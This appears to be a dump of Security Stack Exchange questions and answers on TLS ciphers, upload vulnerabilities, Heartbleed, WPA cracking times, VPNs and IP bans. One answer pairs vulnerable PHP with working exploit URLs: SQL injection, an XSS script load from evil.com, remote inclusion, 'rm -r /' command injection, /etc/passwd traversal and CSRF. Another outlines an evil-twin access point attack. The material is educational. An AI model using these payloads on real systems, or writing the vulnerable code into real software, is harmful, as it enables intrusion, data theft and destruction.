"What ciphers should I use in my web server after I configure my SSL certificate?","35759","","<p>There are many <a href=""https://security.stackexchange.com/questions/tagged/ssl"">great questions</a> that ask what is the best certificate to use for a website; but once the certificate is purchased, there is also the possibility to choose or edit the Cipher list.</p>

<p>Although each vendor may call this setting something slightly different, my understanding is that the Cipher List is used to negotiate encryption protocols between the client and the server.</p>

<blockquote>
  <ol>
  <li><p>What are the basics of choosing a Cipher list for my website?   If
  the defaults need to be altered Where should ""beginners"" go to get
  reliable advice? </p></li>
  <li><p>Have any of the traditional recommendations changed as of September
  2011's BEAST or 2012's CRIME attack?</p></li>
  <li><p>Does anyone maintain a list of ciphers supported by OS/Vendor/and
  version?  Is it correct to say that something like this would be
  useful?  </p></li>
  <li><p>Are some certificates incompatible or not preferred with certain ciphers?</p></li>
  <li><p>Where can I learn more?  Specifically, how can I get a cursory
  ability to compare Ciphers without having to retake some
  post-secondary math classes?</p></li>
  </ol>
</blockquote>
","<p>In <a href=""http://tools.ietf.org/html/rfc5246"">SSL/TLS</a>, the cipher suite selects a set of algorithms, for several tasks: key agreement, symmetric encryption, integrity check.</p>

<p>The <strong>certificate type</strong> impacts the choice of the key agreement. Two parameters must be taken into account: the <em>key type</em> and the <em>key usage</em>:</p>

<ul>
<li>With a RSA key you can nominally use the ""RSA"" and ""DHE_RSA"" cipher suite. But if the server certificate has a Key Usage extension which does <em>not</em> include the ""keyEncipherment"" flag, then you are nominally limited to ""DHE_RSA"".</li>
<li>With a DSA key you can use only a ""DHE_DSS"" cipher suite.</li>
<li>With a Diffie-Hellman key, you can use only one of ""DH_RSA"" or ""DH_DSS"", depending on the issuing certificate authority key type.</li>
</ul>

<p>Most SSL server certificates have a RSA key which is not restricted through a Key Usage extension, so you can use both ""RSA"" and ""DHE_RSA"" key types.</p>

<p>""DHE"" stands for ""Diffie-Hellman Ephemeral"". This allows <a href=""http://en.wikipedia.org/wiki/Perfect_forward_secrecy"">Perfect Forward Secrecy</a>. PFS means that if an attacker steals the server private key (the one which is stored in a file, hence plausibly vulnerable to ulterior theft), he will still not be able to decrypt past recorded transactions. This is a desirable property, especially when you want your system to look good during an audit.</p>

<p>For the <strong>integrity check</strong>, you should not use MD5, and, if possible, avoid SHA-1 as well. None of the currently known weaknesses of MD5 and SHA-1 impacts the security of TLS (except possibly when used within a certificate, but that's chosen by the CA, not you). Nevertheless, using MD5 (or, to a lesser extent, SHA-1) is bad for public relations. MD5 is ""broken"". If you use MD5, you may have to justify yourself. Nobody would question the choice of SHA-256. The general consensus is that SHA-1 is ""tolerable"" for legacy reasons.</p>

<p>For <strong>symmetric encryption</strong>, you have the choice between (mostly) RC4, 3DES and AES (for the latter, the 256-bit version is overkill; AES-128 is already fine). The following points can be made:</p>

<ul>
<li><p>RC4 and 3DES will be supported everywhere. The oldest clients may not support AES (e.g. Internet Explorer 6.0 does not appear to be able to negotiate AES-based cipher suites).</p></li>
<li><p>There are known weaknesses in RC4. None is fatal right away. Situation is somewhat similar to that of SHA-1: academically ""broken"", but not a problem right now. This still is a good reason not to use RC4 if it can be avoided.</p></li>
<li><p>3DES is a 64-bit block cipher. This implies some (academic) weaknesses when you encrypt more than a few gigabytes in a single session.</p></li>
<li><p>3DES can be heavy on your CPU. On a 2.7 GHz Intel i7, <a href=""http://www.openssl.org/"">OpenSSL</a> achieves 180 MB/s encryption speed with AES-128 (it could do much better if it used the <a href=""http://en.wikipedia.org/wiki/AES_instruction_set"">AES-NI instructions</a>) but only 25 MB/s with 3DES. 25 MB/s is still good (that's 2.5x what a 100 Mbits/s link can handle, and using a single core) but might not be negligible, depending on your situation.</p></li>
<li><p>The BEAST attack is an old academic weaknesses which has recently been demonstrated to be applicable in practice. It requires that the attacker spies on the link <em>and</em> runs hostile code on the client (and that code must communicate with the external spying system); the BEAST authors have managed to run it when the hostile internal code uses Java or Javascript. The generic solution is to switch to TLS 1.1 or 1.2, which are immune. Also, this concerns only block ciphers in CBC mode; RC4 is immune.</p></li>
<li><p>In a SSL/TLS handshake, the client announces his supported cipher suites (preferred suites come first), then the server chooses the suite which will be used. It is <em>traditional</em> that the server honours the client preferences -- i.e. chooses the first suite in the list sent by the client that the server can handle. But a server could enforce its own order of preferences.</p></li>
<li><p>DHE implies somewhat higher CPU consumption on the server (but it will not make a noticeable difference unless you establish several hundreds new SSL sessions per second).</p></li>
<li><p>There is no DHE cipher suite which uses RC4.</p></li>
</ul>

<p><strong>Summary:</strong> this leads me to the following preferred list of cipher suites. If the BEAST attack may apply to you (i.e. the client is a Web browser), use this:</p>

<ul>
<li>If the session uses SSL-3.0 or TLS-1.0, try to use <code>TLS_RSA_WITH_RC4_128_SHA</code>.</li>
<li>If the client supports TLS 1.1+, or if it does not support <code>TLS_RSA_WITH_RC4_128_SHA</code>, or if you consider PFS to be more important to you than BEAST-like active attacks (e.g. you are most concerned about long-term confidentiality, not immediate breaches), then use <code>TLS_DHE_RSA_WITH_AES_128_CBC_SHA256</code> (fallback to <code>TLS_DHE_RSA_WITH_AES_128_CBC_SHA</code> if the client does not support SHA-256).</li>
<li>If DHE cipher suites are not supported by the client, use the corresponding non-DHE suite.</li>
<li>Generic fallback is <code>TLS_RSA_WITH_3DES_EDE_CBC_SHA</code> which should work everywhere.</li>
</ul>

<p>Note that the choices above assume that you can alter the suite selection depending on the negotiated protocol version, which may or may not be an available option for your particular SSL server.</p>

<p>If BEAST does not apply to you (the client will not run hostile code), then drop RC4 support altogether; concentrate on AES-128 and SHA-256; fallback on 3DES and SHA-1, respectively; use DHE if available.</p>
","7621"
"Hacker used picture upload to get PHP code into my site","35750","","<p>I'm working on a website — right now it's in early stages of testing, not yet launched and just has test data - thank goodness.</p>

<p>First of all, a hacker figured out the password to log onto the websites 'administration' pages<sup>*</sup>. I think they used a key logger on a friend's computer who logged into the site to give me feedback.</p>

<p>Secondly, they used a picture upload box to upload a PHP file. I have put in strict checking so that only .jpg and .png files are accepted — everything else should have been rejected. Surely there is no way to upload a .jpg file and then change the extension once the file is stored?</p>

<p>Thankfully I also generate new file names when a file is sent to me, so I don't think they were able to locate the file to execute the code.</p>

<p>I just can't seem to figure out how the website let a PHP file through. What's wrong with my security? The validation function code is below:</p>

<pre><code>function ValidateChange_Logo(theForm)
{
   var regexp;
   if (theForm.FileUpload1.value == """")
   {
      alert(""You have not chosen a new logo file, or your file is not supported."");
      theForm.FileUpload1.focus();
      return false;
   }
   var extension = theForm.FileUpload1.value.substr(theForm.FileUpload1.value.lastIndexOf('.'));
   if ((extension.toLowerCase() != "".jpg"") &amp;&amp;
       (extension.toLowerCase() != "".png""))
   {
      alert(""You have not chosen a new logo file, or your file is not supported."");
      theForm.FileUpload1.focus();
      return false;
   }
   return true;
}
</code></pre>

<p>Once the file gets to the server, I use the following code to retain the extension, and generate a new random name. It is a bit messy, but it works well.</p>

<pre><code>// Process and Retain File Extension
$fileExt = $_FILES[logo][name];
$reversed = strrev($fileExt);
$extension0 = substr($reversed, 0, 1);
$extension1 = substr($reversed, 1, 1);
$extension2 = substr($reversed, 2, 1);
$fileExtension = ""."".$extension2.$extension1.$extension0;
$newName = rand(1000000, 9999999) . $fileExtension;
</code></pre>

<p>I've just tested with a name such as <code>logo.php;.jpg</code> and although the picture cannot be opened by the website, it correctly changed the name to <code>123456.jpg</code>. As for <code>logo.php/.jpg</code>, Windows doesn't allow such a file name.</p>

<hr>

<p><sup>* Protected pages on the website that allow simple functions: like uploading a picture that then becomes a new logo for the website. FTP details are completely different to the password used to log onto the protected pages on the website. As are database and cPanel credentials. I've ensured that people can't even view the folder and file structure of the site. There is literally no way I can think of to rename a .jpg, or .png extension to .php on this site if you don't have FTP details.</sup></p>
","<h1>Client side validation</h1>

<p>The validation code you have provided is in JavaScript. That suggests it is code that you use to do the validation on the client.</p>

<p>Rule number one of securing webapps is to <strong>never trust the client</strong>. The client is under the full control of the user - or in this case, the attacker. You can not be sure that any code you send to the client is used for anything, and no blocks you put in place on the client has any security value what so ever. Validation on the client is just for providing a smooth user experience, not to actually enforce any security relevant constraints.</p>

<p>An attacker could just change that piece of JavaScript in their browser, or turn scripts off completely, or just not send the file from a browser but instead craft their own POST request with a tool like curl.</p>

<p><strong>You need to revalidate everything on the server.</strong> That means that your PHP must check that the files are of the right type, something your current code doesn't.</p>

<p>How to do that is a broad issue that I think is outside the scope of your question, but <a href=""https://security.stackexchange.com/questions/32852/risks-of-a-php-image-upload-form"">this question</a> are good places to start reading. You might want to <a href=""https://tomolivercv.wordpress.com/2011/07/24/protect-your-uploads-folder-with-htaccess/"" rel=""noreferrer"">take a look</a> at your <code>.htaccess</code> files as well.</p>

<h1>Getting the extension</h1>

<p>Not a security issue maybe, but <a href=""https://stackoverflow.com/questions/173868/how-to-extract-a-file-extension-in-php"">this</a> is a better way to do it:</p>

<pre><code>$ext = pathinfo($filename, PATHINFO_EXTENSION);
</code></pre>

<h1>Magic PHP functions</h1>

<blockquote>
  <p>When I store data from edit boxes, I use all three of PHP's functions to clean it:</p>

<pre><code>$cleanedName = strip_tags($_POST[name]); // Remove HTML tags
$cleanedName = htmlspecialchars($cleanedName); // Allow special chars, but store them safely. 
$cleanedName = mysqli_real_escape_string($connectionName, $cleanedName);
</code></pre>
</blockquote>

<p>This is not a good strategy. The fact that you mention this in the context of validating file extensions makes me worried that you are just throwing a couple of security related functions at your input hoping it will solve the problem.</p>

<p>For instance, you should be using prepared statements and not escaping to protect against SQLi. Escaping of HTML tags and special characters to prevent XSS needs to be done after the data is retrieved from the database, and how to do it depends on where you insert that data. And so on, and so on.</p>

<h1>Conclusion</h1>

<p>I am not saying this to be mean, but you seem to be doing a lot of mistakes here. I would not be surprised if there are other vulnerabilities. If your app handles any sensitive information I would highly recommend that you let someone with security experience have a look at it before you take it into production.</p>
","147219"
"How to explain Heartbleed without technical terms?","35732","","<p>Most of my friends who are not experienced in computers want to know what Heartbleed is and how it works. How would one explain Heartbleed to someone without a technical background?</p>
","<p><strong>The analogy of the bank and bank employee</strong></p>

<p>You call the bank to request a new bank account, to make an appointment - whatever. Somehow you and the bank make sure that you are who you are, and the bank is actually the bank. This is the TLS process that secures the connection between you and the bank, and we assume this is handled properly. </p>

<p><strong>The roles in this play</strong></p>

<ul>
<li>The bank: a webserver</li>
<li>The bank employee: the OpenSSL service for that server </li>
<li>You (the bank robber): a bot fetching all it can get from that server</li>
</ul>

<p><strong>Staying connected - the heartbeat</strong></p>

<p>A bank employee answers your call. You request some information. The employee says to wait a minute and disables his microphone. He can hear you, you cannot hear him. Then it's quiet. For a long time. You start to wonder if he hung up. So you say ""hello?"" The employee is instructed to echo whatever you say, and replies with ""hello"". This is the heartbeat to check if there is still a connection. </p>

<p>Now with this peculiar bank employee, you need to say first how many words you are going to use before you ask if the employee is still online. So instead of saying ""hello"", you need to say ""one: hello"", or ""two: hello there"". The employee now knows he can reply with repeating those (first) two words, and then can continue to work on your request. This is the heartbeat protocol. </p>

<p><strong>The problem - the heartbleed - no check on what is returned</strong> </p>

<p>OK, you're bored, and you make a joke. You say ""thousand: hello"". The employee doesn't check that you only said one word (hello), and starts to reply with ""hello"" plus then the next 999 words that he says, or thinks about, or has in memory, before putting the mic off. This is the bug that causes the problem. </p>

<p>Those 999 words are unrelated. Most of it will be useless, remarks about the weather, request for coffee, lunch appointments etc. Some of it can be important information about the bank or other customers. A transport of gold, a customer is going to bring in $1m, the code for entering the bank or the safe, etc. </p>

<p>There is no check if there are actually 1000 words to be replied. Plus you can do this request over and over again - the employee won't complain and nobody else is going to notice what is going on. </p>

<p>There is one limit. You will only get information from this one bank employee, and only the stuff he talks or thinks about. Other employees are not affected. You cannot see what is on his desk or in his rolodex. (Analogy: only data in memory (RAM) is at risk; data on the harddisk which is not read into memory, and data from other programs and processes is safe.)</p>

<p>Doing this you don't know what information you will get, but doing it for a long time over and over again, you will get enough information to finally be able to break in without anyone noticing it. You can enter the bank after hours, open the safe, etc. This is the risk involved. </p>

<p><strong>The solution - check request and renew codes</strong></p>

<p>If the employee would think for a moment he would only reply with one word and then disable the microphone so you cannot hear anymore what he is discussing. By making this check, you will stay connected and know that the employee has not hung up, but will not hear any random info anymore. In effect the employee needs new instructions on what to echo. This is fixed with the update to the latest version of OpenSSL. </p>

<p>The bank will have to renew security keys for entering the bank and safe, because it is unknown whether someone has the old codes. </p>
","55400"
"What is preventing us from sniffing the mobile phone communication?","35602","","<p>I'm learning wireless penetration testing. It really is amazing. But it made me wonder, what about mobile phones? They are also means of wireless communication. So, our entire voice must be in the air surrounding us. So, </p>

<ol>
<li>What makes it difficult to intercept?</li>
<li>By the way, is there any standard like 802.11 for Wi-Fi, for telecommunication over mobile phones?</li>
</ol>
","<p>For telecommunications, checkout GSM, CDMA, TDMA, and EDGE. The two competing protocols in the United States are GSM and CDMA. The resources linked below are lacking when it comes to CDMA, but using site:defcon.org and site:blackhat.com in your Google searches will turn up some presentations.</p>

<p>For interception of GSM, I refer you to a white paper on ""Intercepting GSM traffic"" from the BlackHat conference: </p>

<ul>
<li><a href=""http://www.blackhat.com/presentations/bh-dc-08/Steve-DHulton/Whitepaper/bh-dc-08-steve-dhulton-WP.pdf"">Intercepting GSM traffic - Black Hat Briefing - Washington D.C., Feb 2008</a></li>
</ul>

<blockquote>
  <p><strong>Abstract:</strong> This talk is about GSM security. We will explain the
  security, technology and protocols of a GSM network. We will further
  present a solution to build a GSM scanner for 900 USD. The second part
  of the talk reveals a practical solution to crack the GSM encryption
  A5/1.</p>
</blockquote>

<p>The corresponding video of the presentation:</p>

<ul>
<li><a href=""http://www.youtube.com/watch?v=dHTaNBy64kk"">DeepSec 2007: Intercepting GSM traffic</a></li>
</ul>

<p>Also a talk on cellular privacy and the Android platform:</p>

<ul>
<li><a href=""http://www.youtube.com/watch?v=McF50tjuFEs"">DEFCON 19: Cellular Privacy: A Forensic Analysis of Android Network Traffic (w speaker)</a></li>
</ul>

<p>and a whitepaper on the <a href=""http://en.wikipedia.org/wiki/Lawful_interception"">Lawful Interception</a> for 3G and 4G Networks (though see first comment on this answer):</p>

<ul>
<li><a href=""http://www.aqsacomna.com/us/articles/Aqsacom_White_Paper_4G_LI_v1.pdf"">Lawful Interception for 3G and 4G Networks - White Paper by AQSACOM</a></li>
</ul>

<blockquote>
  <p>This document will first provide a brief description of the various
  evolutions of public  mobile networks that have been commercially
  deployed, followed by a discussion on the  evolution toward the newer
  “long term evolution” technologies.  We then discuss possible 
  configurations for lawful interception of the evolving mobile
  networks, followed by descriptions of approaches to 3G / 4G
  interception solutions now available from Aqsacom.</p>
</blockquote>

<p>And a SANS article on GSM security:</p>

<ul>
<li><a href=""http://www.sans.org/reading_room/whitepapers/telephone/gsm-standard-an-overview-security_317"">The GSM Standard: an overview of its security</a></li>
</ul>

<p>Also note that smart phones typically just automatically connect to networks with SSIDs it remembers. Sniff the airwaves for beacons that it is sending out and set up an evil access point with a matching SSID. Launch a remote attack across the network or man in the middle the device and launch a client-side attack appropriate to the device.</p>
","16042"
"What are HTTP GET/POST flood attacks?","35473","","<p>I want to know what the main differences are between HTTP GET and POST flood attacks and mitigation strategies for both.</p>

<p>I searched a lot but I really can't find some good articles nor examples about these attacks.</p>
","<p>When an HTTP client (say, a Web browser) talks to an HTTP server (a Web server), it sends requests which can be of several types, the two main being <code>GET</code> and <code>POST</code>. A <code>GET</code> request is what is used for ""normal links"", including images; such requests are meant to retrieve a static piece of data, the URL pointing to that piece of data. When you enter a URL in the URL bar, a <code>GET</code> is also done.</p>

<p><code>POST</code> requests are used with forms. A <code>POST</code> request includes parameters, which are usually taken from the input fields on the same page.</p>

<p>When flooding, the attacker wants to submerge the target server under many requests, so as to saturate its computing resources. Flooding works best when the server allocates a lot of resources in response to a single request. Since <code>POST</code> requests include parameters, they usually trigger relatively complex processing on the server (e.g. database accesses), which are more expensive for the server than serving a much simpler <code>GET</code>. Thus, <code>POST</code>-based flooding tends to be more effective than <code>GET</code>-based flooding (it takes fewer requests to drown the server if the requests are <code>POST</code>). On the other hand, <code>GET</code> requests being much more common, it is often way easier for the attacker to enlist (involuntary) help in his flooding effort when <code>GET</code>-flooding (as @Rory says, it only takes a link for an inline image on a popular site, and everybody who browses that site automatically sends a <code>GET</code> request to the target server).</p>

<p>(Of course, any particular Web site could do a lot of complex processing on some specific <code>GET</code> requests; I am only discussing <em>average</em> behaviour here.)</p>
","29223"
"How long to brute-force WPA password?","35274","","<p>Bob has a password (for his WPA encrypted wifi) which is 8 characters, all lowercase, and not a dictionary word. </p>

<p>Eve lives next door to Bob and wants to illegally hack his WPA.  The number of possible passwords is 26^8 (is that right?).</p>

<p>EDIT: The ssid is not common, and there is no rainbow table available for it.</p>

<p>How long will it take Eve to brute force that password if she has
a: a regular desktop machine from 2011
b: a powerful desktop, with GPU (does GPU help at all in this case?)
c: a GPU cluster of 8 cards
d: access to amazon cloud GPU clustering and a couple of hundred dollars.</p>

<hr>

<p>another edit:</p>

<p>The UK's only cable ISP (Virgin media) provides a combined modem / wifi router.  This is supplied with an SSID of the form ""virginmedia1234567"" (The word virginmedia with a 7 digit random number), with a random password of the form ""abcdefgh"" (8 lowercase letters).  I have this router, and have changed everything.  Many neighbours also have this router.  I have no idea (and I'm not going to try to find out) if they've changed their passwords.</p>
","<p>(a) a desktop CPU can do roughly 1000 passwords/second.
(b) a desktop GPU (graphics processor) can do roughly 80000 passwords/second, or 80 times the speed of a CPU, or 30 days to crack your hypothetical password
(c) a cluster of 8 GPUs is 8 times the previous number, or 8*80000 or 640k passwords/second, or 4 days to crack your hypothetical password
(d) Amazon EC2 uses older/slower GPUs</p>

<p>You say ""not dictionary word"", but it's more complicated than that.</p>

<p>The ""dictionaries"" used by password crackers aren't the ""English dictionary"", but dictionaries of known passwords. The most common dictionary is the list of 20 million RockYou passwords. These were passwords chosen by users of a website that was hacked. Once hackers broke in, they published all the passwords, so they form the basis of cracking dictionaries. This is many times larger than an English dictionary, and contains such things as ""ncc1701"" (Star Trek ship designation).</p>

<p>Furthermore, cracking looks at ""mutations"" of dictionary words. Thus, while your password may not be in the RockYou list, it might be a near match that will eventually be found.</p>
","7560"
"Adding self signed certificate to trusted store","35271","","<p>I have been reading about certificates and often is said that self signed certificate should not be added to the trusted authority store and even if you did, remove it after usage immediately.</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/ms733813.aspx"">MSDN How to: Create Temporary Certificates for Use During Development</a></p>

<blockquote>
  <p>Be sure to delete any temporary root authority certificates from the
  Trusted Root Certification Authorities and Personal folders by
  right-clicking the certificate, then clicking Delete.</p>
</blockquote>

<p>Why is adding a self signed certificate to the trusted store considered a security risk? How can this be exploited by a hacker ?</p>

<p>Can someone please explain me with example ?</p>
","<p>Imagine you want to visit <a href=""https://www.google.com"" rel=""noreferrer"">https://www.google.com</a>.</p>

<p>How can you be sure that you are in fact visiting <a href=""https://www.google.com"" rel=""noreferrer"">https://www.google.com</a>? You can check the information provided by the SSL certificate is authentic.</p>

<p><img src=""https://i.stack.imgur.com/DEimt.png"" alt=""enter image description here""></p>

<p>If an attacker performs a MITM attack against you, the browser will display a warning in the form of a red padlock instead of a green one.</p>

<p><img src=""https://i.stack.imgur.com/hQa36.png"" alt=""enter image description here""></p>

<p>If an attacker has the ability to add a self-signed certificate to your trusted store, the browser will verify that the fake website the attacker is using to attack you is in fact authentic. This has obvious security implications as you will have no ability to verify a website's authenticity through the SSL certificate.</p>

<p>(<strong>EDIT</strong>: Thanks @Adnan and @D3C4FF for pointing out my answer originally does not address the situation of your adding own development certificates.)</p>

<p>With regards to adding certificates you generated yourself for development purposes, I do not think there is any large security risk. Assuming that the root CA cert you generated is kept local and not published somewhere (or better still deleted after you are done with it), no one else will be able to sign certificates that will show up as trusted on your browser. Microsoft's suggestion is still a sound one though, no point cluttering up your root store with random certificates you generated yourself. This <em>might</em> make spotting an actual malicious root certificate added by an attacker that much harder.  </p>
","36914"
"How safe is it to connect to Internet through VPN?","35214","","<p>Sometimes I connect to the Internet using a VPN connection to be able to access the blocked websites. I've got a few questions regarding this:</p>

<ol>
<li>Are my important data (like my credentials) vulnerable to be eavesdropped on the VPN server? What if the protocol of web site I am connecting to is <code>HTTPS</code>? (like gmail)</li>
<li>Is the owner of VPN server able to access anything on my computer (files and folders) via this connection?</li>
<li>If the answer to any of the above questions is Yes, is there any counter measures to prevent it?</li>
</ol>

<p>Any advice would be appreciated!</p>
","<p>You need to think of connecting to a VPN like walking over to a physical network and plugging your computer into a switch there.  So:</p>

<ol>
<li><p>If you use HTTP, everything is sent in plain text.  The VPN server can read everything.  If you use HTTPS, only the domain of the server will be known by the VPN server.  The first step in a HTTPS session is to establish an SSL connection, everything is encrypted from there.</p></li>
<li><p>If you have open ports on your computer (sharing files, music, etc.) this will be visible to the VPN server. Other than this, nothing is revealed.  Again, it's as if you were connected to a physical network. The VPN server doesn't gain any other special privileges.</p></li>
</ol>

<p>There is one exception to this, what VPN software are you using?  Do you verify the source?  If you received the VPN software from a questionable source, it could contain a trojan which allows outside attackers access to your computer.</p>

<p>Have you considered Tor or Freenode?  These can run by themselves, or in addition to a VPN to give you privacy when visiting standard HTTP websites.</p>
","9778"
"Why do people use IP address bans when IP addresses often change?","35171","","<p>Why do people use IP address bans (e.g. to block a malicious user from an internet service) when IP addresses change often?</p>

<p>For example, we turn our router off every night so our IP address often changes in the morning. Furthermore, often a simple power-cycle is enough to change the IP address. Thus IP address bans are relatively ineffective.</p>

<p>On the other hand, banning IP addresses can cause a lot of grief for innocent users who are using the former IP addresses of a malicious user, and sometimes a range of IP addresses is banned thus causing the banning of innocent users to affect even more people.</p>

<p>So why are IP address bans still used?</p>

<p>P.S. I am referring specifically to long-term bans. I perfectly understand the advantages of short-term bans e.g. to put a block on a spam or DoS attack, or other situations where briefly disrupting the malicious traffic is beneficial.</p>
","<p>IP address bans have flaws as you mention, but I think the primary reason they are used is simply that there aren't really any better alternatives. Other identifying features, like browser user agent, cookies, browser fingerprint, etc. are even easier to spoof or circumvent. There are plenty of extensions you can use to change your user agent or fingerprint, and cookies can simply be cleared.</p>

<blockquote>
  <p>For example, we turn our router off every night so our IP address
  often changes in the morning. Furthermore, often a simple power-cycle
  is enough to change the IP address. Thus IP address bans are
  relatively ineffective.</p>
</blockquote>

<p>The ease with which you can change your IP address depends heavily on the ISP. For instance, back when I had <a href=""https://en.wikipedia.org/wiki/Verizon_Communications"">Verizon</a> DSL, my IP address would change each time I turned the modem off and back on just like what you describe. But after switching to <a href=""https://en.wikipedia.org/wiki/Comcast"">Comcast</a>, my IP address has not changed for the entire two years I've been with them, even after multiple power outages and modem restarts. So the ""router reboot"" workaround won't necessarily work for everyone.</p>

<p>Another thing you should consider is that even if you're one of those people who can change your IP address with a reboot, you're likely still getting an IP address from a fairly limited pool of addresses. This is because ISPs generally don't assign addresses completely randomly; they divide their service area into smaller areas (e.g. neighborhoods), and then allocate a small range of addresses to assign to customers in each area. So if there was a <em>really</em> persistent and problematic user, a site administrator could ban the entire address range (though this could cause significant problems for other users as you mention).</p>

<p><em>Side note: It's worth mentioning that there are other ways of masking your IP address that get around this problem, like using a VPN service or <a href=""http://en.wikipedia.org/wiki/Tor_%28anonymity_network%29"">Tor</a>. Some sites, like Wikipedia, try to block all IP addresses of known public proxies to counter this.</em></p>

<blockquote>
  <p>On the other hand, banning IP addresses can cause a lot of grief for
  innocent users who are using the former IP addresses of a malicious
  user, and sometimes a range of IP addresses is banned thus causing the
  banning of innocent users to affect even more people.</p>
</blockquote>

<p>Yes, IP address bans are a blunt tool and this is one of the problems inherent with them. This is especially the case when an IP address is shared by hundreds or thousands of users in the same building, or even a large part of an <a href=""https://en.wikipedia.org/wiki/User:82.148.97.69"">entire nation</a> via carrier-grade <a href=""http://en.wikipedia.org/wiki/Network_address_translation"">NAT</a>. It is the responsibility of site administrators to minimize the effects of IP address bans on legitimate users. Various measures can be taken - for instance, you could make an effort to identify IP addresses are shared and make sure those IP addresses are only banned for short periods, or make it so that users with a certain minimum reputation can still log in from banned IP addresses and remain unaffected by them. If done right, IP address bans can be very effective at blocking unwanted users while having minimal impact on legitimate ones.</p>
","96387"
"How does hacking work?","35125","","<p>I am specifically talking about web servers, running Unix. I have always been curious of how hackers get the entry point. I mean I don't see how a hacker can hack into the webpage when the only entry method they have into the server is a URL. I must be missing something, because I see no way how the hacker can get access to the server just by changing the URL.</p>

<p>By entry point I mean the point of access. The way a hacker <em>gets into the server.</em></p>

<p><strong>Could I get an example of how a hacker would make an entry point into a webserver?</strong> Any C language is acceptable. I have absolutely no experience in hacking</p>

<p>A simple example would be appreciated.</p>
","<h2> Hacks that work just by changing the URL</h2>

<ul>
<li>One legit and one malicious example</li>
<li>Some examples require URL encoding to work (usually done automatically by browser)</li>
</ul>

<h2><a href=""http://xkcd.com/327/"" rel=""nofollow noreferrer"">SQL Injection</a></h2>

<p><strong>code:</strong> </p>

<pre><code>$username = $_POST['username'];
$pw = $_GET['password'];
mysql_query(""SELECT * FROM userTable WHERE username = $username AND password = $pw"");
</code></pre>

<p><strong>exploit (logs in as administrator without knowing password):</strong></p>

<pre><code>example.com/?username=Administrator&amp;password=legalPasswordThatShouldBePostInsteadOfGet
example.com/?username=Administrator&amp;password=password' or 1=1--
</code></pre>

<hr>

<h2><a href=""https://security.stackexchange.com/a/1373/294"">Cross Site Scripting (XSS)</a></h2>

<p><strong>code:</strong> </p>

<pre><code>$nickname= $_GET['nickname'];
echo ""&lt;div&gt;Your nickname is $nickname&lt;/div&gt;\n"";
</code></pre>

<p><strong>exploit (registrers visiting user as a zombie in <a href=""http://www.bindshell.net/tools/beef.html"" rel=""nofollow noreferrer"">BeEF</a>):</strong> </p>

<pre><code>example.com/?nickname=Karrax
example.com/?nickname=&lt;script src=""evil.com/beefmagic.js.php"" /&gt;
</code></pre>

<hr>

<h2>Remote code execution</h2>

<p><strong>code (Tylerl's example):</strong></p>

<pre><code>&lt;? include($_GET[""module""]."".php""); ?&gt;
</code></pre>

<p><strong>exploit (downloads and runs arbitrary code) :</strong></p>

<pre><code>example.com/?module=frontpage
example.com/?module=pastebin.com/mymaliciousscript
</code></pre>

<hr>

<h2>Command injection</h2>

<p><strong>code:</strong></p>

<pre><code>&lt;?php
echo shell_exec('cat '.$_GET['filename']);
?&gt;
</code></pre>

<p><strong>exploit (tries to delete all files from root directory):</strong></p>

<pre><code>example.com/?filename=readme.txt
example.com/?filename=readme.txt;rm -r /
</code></pre>

<hr>

<h2>Code injection</h2>

<p><strong>code:</strong></p>

<pre><code>&lt;?php
$myvar = ""varname"";
$x = $_GET['arg'];
eval(""\$myvar = \$x;"");
?&gt;
</code></pre>

<p><strong>exploit (injects phpinfo() command which prints very usefull attack info on screen):</strong></p>

<pre><code>example.com/?arg=1
example.com/?arg=1; phpinfo() 
</code></pre>

<hr>

<h2>LDAP injection</h2>

<p><strong>code:</strong></p>

<pre><code>&lt;?php
$username = $_GET['username'];
$password = $_GET['password'];
ldap_query(""(&amp;(cn=$username)(password=$password)"")
?&gt;
</code></pre>

<p><strong>exploit (logs in without knowing admin password):</strong></p>

<pre><code>example.com/?username=admin&amp;password=adminadmin
example.com/?username=admin&amp;password=*
</code></pre>

<hr>

<h2>Path traversal</h2>

<p><strong>code:</strong></p>

<pre><code>&lt;?php
include(""./"" . $_GET['page']);
?&gt;
</code></pre>

<p><strong>exploit (fetches /etc/passwd):</strong></p>

<pre><code>example.com/?page=front.php
example.com/?page=../../../../../../../../etc/passwd
</code></pre>

<hr>

<h2>Redirect/Forward attack</h2>

<p><strong>code:</strong></p>

<pre><code> &lt;?php
 $redirectUrl = $_GET['url'];
 header(""Location: $redirectUrl"");
 ?&gt;
</code></pre>

<p><strong>exploit (Sends user from your page to evil page) :</strong></p>

<pre><code>example.com/?url=example.com/faq.php
example.com/?url=evil.com/sploitCode.php
</code></pre>

<hr>

<h2>Failure to Restrict URL Access</h2>

<p><strong>code:</strong></p>

<pre><code>N/A. Lacking .htaccess ACL or similar access control. Allows user to guess or by other 
means discover the location of content that should only be accessible while logged in.
</code></pre>

<p><strong>exploit:</strong></p>

<pre><code>example.com/users/showUser.php
example.com/admins/editUser.php
</code></pre>

<hr>

<h2>Cross-Site Request Forgery</h2>

<p><strong>code:</strong></p>

<pre><code>N/A. Code lacks page to page secret to validate that request comes from current site.
Implement a secret that is transmitted and validated between pages. 
</code></pre>

<p><strong>exploit:</strong></p>

<pre><code>Legal: example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243
On evil page: &lt;img src=""http://example.com/app/transferFunds?amount=1500
destinationAccount=evilAccount#"" width=""0"" height=""0"" /&gt;
</code></pre>

<hr>

<h2>Buffer overflow (technically by accessing an URL, but implemented with metasploit</h2>

<p>code:</p>

<pre><code>N/A. Vulnerability in the webserver code itself. Standard buffer overflow
</code></pre>

<p>Exploit (Metasploit + meterpreter?):</p>

<pre><code>http://www.exploit-db.com/exploits/16798/
</code></pre>
","11248"
"How does Google's ""No Captcha reCaptcha"" work?","35073","","<p>Google has released a new form of captcha identification of bots, that asks the user to click a single checkbox. It uses image-based verification only if necessary.</p>

<p>Could someone please explain to me as to how such a program differentiates a human from a bot?</p>

<p>There is a program <a href=""http://www.murgee.com/auto-mouse-click/"">here</a> that can perform mouse clicks on your computer. It can not be detected by a web-based program with no access to your program files. It should be possible to write an undetectable Windows executable that can tick the check box. One could also randomize the response time of the program.</p>

<p>After a few (successful) attempts, the captcha will ask for image verification. Maybe that can be solved by an AI that searches the images using Google Image Search (by image), and makes guesses based on the filenames of 'visually similar' images. If the images used are not from the net, then they would be limited in number, and one could create a database of them.</p>

<p>Could someone clarify whether these approaches could actually work?</p>
